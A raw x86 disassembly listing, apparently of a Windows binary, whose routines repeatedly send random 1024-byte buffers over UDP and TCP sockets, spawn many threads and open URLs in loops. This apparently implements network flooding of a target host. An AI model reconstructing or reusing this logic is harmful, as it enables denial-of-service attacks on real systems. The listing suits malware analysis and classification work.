jmp r-xdata
push 0x0
push 0x0
push 0x0
push ebx
call GetMessageA
test eax eax
jne r-xdata
push ebx
call TranslateMessage
push ebx
call DispatchMessageA
add esp 0x1c
pop ebx
retn
sub_482058
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4820bb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4820c2
retn
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
sub_4820c4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_482142
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4033b8
lea eax [ ebp - 0x4 ]
call sub_405530
mov ebx 0x400
mov eax 0x47
call sub_4033e0
mov esi eax
inc esi
lea eax [ ebp - 0x8 ]
mov edx r-xdata
movzx edx [ edx + esi - 0x1 ]
call sub_405718
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_405818
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_405584
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482149
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_482153
inc [ edi ]
add [ eax ] al
xor [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
add al ch
cmp eax edi
jb r-xdata
dec [ ebx + 0x1ba49c8 ]
add [ eax ] al
add [ ebx + 0x4ae8f445 ] cl
cmp al bh
dec [ ebx - 0x41f7b ]
clc
je r-xdata
dec ecx
mov edx 0x1
jbe r-xdata
lea eax [ ebp - 0x1c ]
xor ecx ecx
mov edx 0x10
call sub_403af4
mov [ ebp - 0x1c ] 0x2
push esi
call inet_addr
mov [ ebp - 0x18 ] eax
push edi
call htons
mov [ ebp - 0x1a ] ax
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
push 0x0
call ExitThread
mov eax [ ebp - 0xc ]
call sub_405a44
mov eax [ ebp - 0x420 ]
call sub_4059dc
mov esi eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0xc ]
call sub_409edc
mov edi eax
lea eax [ ebp - 0x4 ]
call sub_4820c4
push 0x0
push 0x2
push 0x2
call socket
mov ebx eax
test ebx ebx
jge r-xdata
add [ eax ] al
js r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push esi
call gethostbyname
mov esi eax
test esi esi
jne r-xdata
hlt
jpe r-xdata
push 0x10
lea edx [ ebp - 0x1c ]
push edx
push 0x0
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sendto
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x41c ]
call sub_405728
push 0x3e8
call Sleep
push ebx
call closesocket
push 0x0
call ExitThread
sub eax 0x4
mov eax [ eax ]
mov eax [ esi + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
push 0x0
call ExitThread
rcl [ ebp + 0x68 ] 0x2
and ecx [ eax ]
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
call sub_405728
lea eax [ ebp - 0x420 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec edx
dec ebx
dec esp
dec ebp
dec esi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
das
sub ch [ 0xffffffffb53d2e2b ]
mov [ 0x252324 ] eax
push ebp
mov ebp esp
add esp 0xfffffbe0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
sub_4824b0
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_482542
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x408 ]
xor ecx ecx
mov edx 0x400
call sub_403af4
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx eax
dec edx
test edx edx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
push 0x0
push 0x400
lea eax [ ebp - 0x408 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call send
test eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482549
lea eax [ ebp - 0x4 ]
call sub_405530
retn
inc edx
xor esi esi
lea eax [ ebp - 0x408 ]
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + esi ]
mov [ eax ] cl
inc esi
inc eax
dec edx
jne r-xdata
sub_482554
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4825d2
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4033b8
lea eax [ ebp - 0x4 ]
call sub_405530
mov ebx 0x400
mov eax 0x47
call sub_4033e0
mov esi eax
inc esi
lea eax [ ebp - 0x8 ]
mov edx r-xdata
movzx edx [ edx + esi - 0x1 ]
call sub_405718
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_405818
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_405584
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4825d9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_4825e3
inc [ edi ]
add [ eax ] al
xor [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
add al ch
scasb [ edi ]
xor al 0xf8
jb r-xdata
dec [ ebx + 0x1ba49c8 ]
add [ eax ] al
add [ ebx - 0x45170bbb ] cl
xor edi eax
dec [ ebx - 0x41f7b ]
clc
je r-xdata
dec ecx
mov edx 0x1
jbe r-xdata
lea eax [ ebp - 0x1c ]
xor ecx ecx
mov edx 0x10
call sub_403af4
mov [ ebp - 0x1c ] 0x2
push esi
call inet_addr
mov [ ebp - 0x18 ] eax
push edi
call htons
mov [ ebp - 0x1a ] ax
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
push 0x0
call ExitThread
mov eax [ ebp - 0xc ]
call sub_405a44
mov eax [ ebp - 0x420 ]
call sub_4059dc
mov esi eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0xc ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0xc ]
call sub_409edc
mov edi eax
lea eax [ ebp - 0x4 ]
call sub_482554
push 0x6
push 0x1
push 0x2
call socket
mov ebx eax
test ebx ebx
jge r-xdata
add [ eax ] al
js r-xdata
push 0x10
lea eax [ ebp - 0x1c ]
push eax
push ebx
call connect
test eax eax
jge r-xdata
push esi
call gethostbyname
mov esi eax
test esi esi
jne r-xdata
hlt
jpe r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4824b0
push 0x0
push 0x400
lea eax [ ebp - 0x41c ]
push eax
push ebx
call recv
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x41c ]
call sub_405728
push 0x3e8
call Sleep
push ebx
call closesocket
push 0x0
call ExitThread
push 0x0
call ExitThread
mov eax [ esi + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
push 0x0
call ExitThread
rcl [ ebp + 0x68 ] 0xa8
daa
dec eax
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
call sub_405728
lea eax [ ebp - 0x420 ]
push eax
mov edx [ ebp - 0xc ]
mov eax r-xdata
call sub_405b28
mov ecx eax
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec edx
dec ebx
dec esp
dec ebp
dec esi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
das
sub ch [ 0xffffffffb53d2e2b ]
mov [ 0x252324 ] eax
push ebp
mov ebp esp
add esp 0xfffffbe0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
sub_482929
push esp
push edx
inc ebp
push ebx
push ebp
dec esp
push esp
push ebx
jns r-xdata
pop ebp
or [ ebp + 0x158bf445 ] cl
push eax
sub [ eax ] ecx
and [ esi + 0x6c ] al
outsd
outsd
jl r-xdata
mov [ ebp - 0x1c ] 0x2
push esi
call htons
mov [ ebp - 0x1a ] ax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call inet_addr
mov edi eax
mov [ ebp - 0x18 ] edi
inc edi
jne r-xdata
push 0x0
call ExitThread
call sub_405fe8
xor eax eax
push ebp
push r-xdata
in al dx
jns r-xdata
push 0x10
lea eax [ ebp - 0x1c ]
push eax
push ebx
call connect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call gethostbyname
mov edi eax
test edi edi
jne r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
mov ecx 0x8
mov edx ebx
call sub_408560
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4055c8
mov esi [ ebx + 0x4 ]
lea eax [ ebp - 0x1c ]
xor ecx ecx
mov edx 0x10
call sub_403af4
push 0x0
push 0x1
push 0x2
call socket
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
add al ch
aaa
clc
push [ ebx ]
rcl [ ebp + 0x68 ] 0x3
sub ecx [ eax ]
and [ ecx + 0x73 ] dh
imul esp [ eax ] 0x66
imul ebp [ esi + 0x69 ] 0x64656873
and [ eax + eax ] edi
add [ ecx + ebp + 0x48 ] dl
add [ esi ] cl
add eax 0x61635354
outsb
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jo r-xdata
push ebx
call closesocket
push 0x0
call ExitThread
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_409d70
push [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4058e0
mov eax [ ebp - 0x20 ]
call sub_475e2c
push ebx
call closesocket
push 0x0
call ExitThread
mov eax [ edi + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
push 0x0
call ExitThread
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
add esp 0xffffffdc
push ebx
push esi
push edi
xor eax eax
dec eax
add [ esi ] cl
or dl [ ebx + edx * 2 + 0x63 ]
popad
outsb
push edx
popad
outsb
or al 0x0
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
sub_482b2b
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] bh
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe8
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
push ebp
push r-xdata
push [ fs : ecx ]
mov [ fs : ecx ] esp
lea eax [ ebp - 0x10 ]
mov ecx 0xc
mov edx ebx
call sub_408560
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4055c8
mov eax [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
mov edi edx
sub edi eax
jl r-xdata
push 0x0
call ExitThread
inc edi
mov [ ebp - 0x14 ] eax
push 0x8
push 0x40
call LocalAlloc
mov ebx eax
mov esi ebx
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_405584
mov eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push ebx
push r-xdata
push 0x0
push 0x0
call CreateThread
push 0x64
call Sleep
inc [ ebp - 0x14 ]
dec edi
jne r-xdata
push 0x0
call ExitThread
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
sub_482c40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_482cb2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xc
push 0x40
call LocalAlloc
mov esi eax
mov ebx esi
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_405584
mov [ ebx + 0x4 ] edi
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
push esi
push r-xdata
push 0x0
push 0x0
call CreateThread
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_482cb9
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_482cc0
les ebp [ eax + ecx * 2 ]
add [ esi ] cl
add al 0x54
push edx
push eax
inc ebx
add al 0x0
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
mov edx [ sub_482cc0 ]
call sub_405fe8
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov ecx 0x4
mov edx ebx
call sub_408560
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call inet_addr
mov [ ebp - 0x14 ] eax
push 0x2
push 0x4
lea eax [ ebp - 0x14 ]
push eax
call gethostbyaddr
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_405974
jne r-xdata
push [ rw-data ]
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx ]
call sub_40aaa8
push [ ebp - 0x1c ]
push r-xdata
mov eax rw-data
mov edx 0x5
call sub_4058e0
push 0x0
call ExitThread
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
sub_48317c
push ebp
mov ebp esp
add esp 0xfffffbbc
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x444 ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_405fe8
lea esi [ ebp - 0x42c ]
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c07c
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x20 ]
mov ecx 0x14
mov edx ebx
call sub_408560
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4055c8
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
call sub_4055c8
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_4055c8
lea ecx [ ebp - 0x440 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4613d8
mov edx [ ebp - 0x440 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
call sub_41c198
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x43c ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x43a ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov ebx eax
mov [ ebp - 0x438 ] ebx
inc ebx
jne r-xdata
push 0x0
call ExitThread
push 0x10
lea eax [ ebp - 0x43c ]
push eax
mov eax [ ebp - 0x28 ]
push eax
call connect
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x28 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
mov ebx eax
test ebx ebx
jne r-xdata
push 0x2
mov eax [ ebp - 0x28 ]
push eax
call shutdown
mov eax [ ebp - 0x28 ]
push eax
call closesocket
mov eax [ ebp - 0x2c ]
call sub_404650
push 0x0
call ExitThread
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x444 ]
mov edx 0x4
call sub_4058e0
mov edx [ ebp - 0x444 ]
mov eax [ ebp - 0x28 ]
call sub_475ecc
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x28 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x438 ] eax
push 0x0
call ExitThread
push 0x0
push 0x0
mov eax [ ebp - 0x2c ]
call sub_41b734
push 0x0
push ebx
push esi
mov eax [ ebp - 0x28 ]
push eax
call send
inc eax
je r-xdata
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x28 ]
push eax
call recv
inc eax
je r-xdata
test ebx ebx
jg r-xdata
mov eax esi
xor ecx ecx
mov edx 0x400
call sub_403af4
mov edx esi
mov ecx 0x400
mov eax [ ebp - 0x2c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jle r-xdata
sub_48343b
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] bh
add [ eax + 0x34 ] cl
dec eax
add [ esi ] cl
or al 0x54
push esi
imul esi [ ebx + 0x69 ] 0x72685474
popad
or [ fs : eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffbd8
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_483630
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_4835bf
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0xc ]
mov ecx 0x8
mov edx ebx
call sub_408560
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4055c8
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
dec eax
test eax eax
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x418 ]
xor ecx ecx
mov edx 0x400
call sub_403af4
push 0x0
push 0x0
push 0x0
push 0x0
push r-xdata
call InternetOpenA
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x10 ]
push eax
call InternetOpenUrlA
push eax
call InternetCloseHandle
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call InternetCloseHandle
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax [ ebp - 0x14 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x420 ]
call sub_409e5c
push [ ebp - 0x420 ]
push r-xdata
lea eax [ ebp - 0x41c ]
mov edx 0x5
call sub_4058e0
mov eax [ ebp - 0x41c ]
call sub_475e2c
push 0x0
call ExitThread
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483637
lea eax [ ebp - 0x428 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4836d5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffbe4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_483817
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi 0x50
push r-xdata
lea eax [ ebp - 0x41c ]
mov edx esi
call sub_405728
push [ ebp - 0x41c ]
push 0x0
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4058e0
push 0x6
push 0x1
push 0x2
call socket
mov ebx eax
test ebx ebx
jge r-xdata
lea eax [ ebp - 0x18 ]
xor ecx ecx
mov edx 0x10
call sub_403af4
mov [ ebp - 0x18 ] 0x2
push esi
call inet_addr
mov [ ebp - 0x14 ] eax
push edi
call htons
mov [ ebp - 0x16 ] ax
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
push 0x0
call ExitThread
push 0x10
lea eax [ ebp - 0x18 ]
push eax
push ebx
call connect
test eax eax
jge r-xdata
push esi
call gethostbyname
mov esi eax
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_475f68
push 0x0
push 0x400
lea eax [ ebp - 0x418 ]
push eax
push ebx
call recv
lea eax [ ebp - 0x8 ]
lea edx [ ebp - 0x418 ]
call sub_405728
push 0x3e8
call Sleep
push ebx
call closesocket
push 0x0
call ExitThread
push 0x0
call ExitThread
mov eax [ esi + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
push 0x0
call ExitThread
sub_48384f
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffdc
push ebx
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_405728
lea eax [ ebp - 0x1c ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x1c ]
call sub_4059dc
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x4 ]
call sub_40b740
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x18 ]
fmul [ r-xdata ]
fstp [ ebp - 0x18 ]
fwait
mov [ ebp - 0x18 ] 0xc0000000
mov [ ebp - 0x14 ] 0x9502f8ff
mov [ ebp - 0x10 ] 0x4020
push 0x64
call Sleep
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push ebx
push r-xdata
push 0x0
push 0x0
call CreateThread
fld [ ebp - 0x18 ]
fsub [ r-xdata ]
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
ja r-xdata
lea eax [ ebp - 0x24 ]
call sub_48ce74
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x20 ]
call sub_475e2c
push 0x0
call ExitThread
sub_4839ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_483bdc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx eax
cmp edx 0x1
jl r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483be3
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + edx - 0x1 ]
movzx eax al
add eax 0xffffffd0
cmp eax 0x36
ja r-xdata
mov ebx [ ebp - 0x4 ]
mov eax ebx
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_483a50 ]
jmp [ eax * 4 + jump_table_483a87 ]
cmp eax edx
jne r-xdata
sub eax 0x4
mov eax [ eax ]
xor esi esi
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x3
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x5
jmp r-xdata
mov esi 0x6
jmp r-xdata
mov esi 0x7
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x9
jmp r-xdata
mov esi 0xa
jmp r-xdata
mov esi 0xa
jmp r-xdata
mov esi 0xb
jmp r-xdata
mov esi 0xb
jmp r-xdata
mov esi 0xc
jmp r-xdata
mov esi 0xc
jmp r-xdata
mov esi 0xd
jmp r-xdata
mov esi 0xd
jmp r-xdata
mov esi 0xe
jmp r-xdata
mov esi 0xe
jmp r-xdata
mov esi 0xf
jmp r-xdata
mov esi 0xf
mov ecx 0x1
mov eax ebx
test eax eax
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp eax 0x1
jl r-xdata
sub eax 0x4
mov eax [ eax ]
dec edx
test edx edx
jne r-xdata
mov eax esi
imul eax ecx
add [ ebp - 0x8 ] eax
shl ecx 0x4
dec eax
test eax eax
jne r-xdata
sub_483bed
cmp ecx [ eax ]
adc [ edx ] eax
xor al [ cs : ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ edx ] cl
push ebp
outsb
je r-xdata
leave
jb r-xdata
mov eax [ ebp - 0x34 ]
push eax
push 0x0
push 0x10
call OpenProcess
mov [ ebp - 0x24 ] eax
mov eax r-xdata
call sub_475e2c
push 0x0
call ExitThread
shr eax cl
loopne r-xdata
arpl [ ebp + 0x73 ] sp
jae r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x4
push 0x0
push 0x0
push 0x40000000
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
call CreateFileA
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0xffffffff
jne r-xdata
mov eax r-xdata
call sub_475e2c
push 0x0
call ExitThread
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov edi [ ebx + 0x8 ]
mov eax [ ebx + 0xc ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x10 ]
call sub_4055c8
mov eax edi
sub eax esi
cmp eax 0x1
jae r-xdata
clc
dec [ ebx - 0x33ba76fd ]
shl [ ebp + eax - 0x7d ] 0xe8
add al 0x8b
add [ ebx + 0x87c01f8 ] al
mov edx 0x4
call sub_403af4
xor eax eax
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x8 ]
call sub_405530
lea eax [ ebp - 0x1c ]
mov ecx 0x14
mov edx ebx
call sub_408560
mov eax [ ebx ]
mov [ ebp - 0x34 ] eax
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
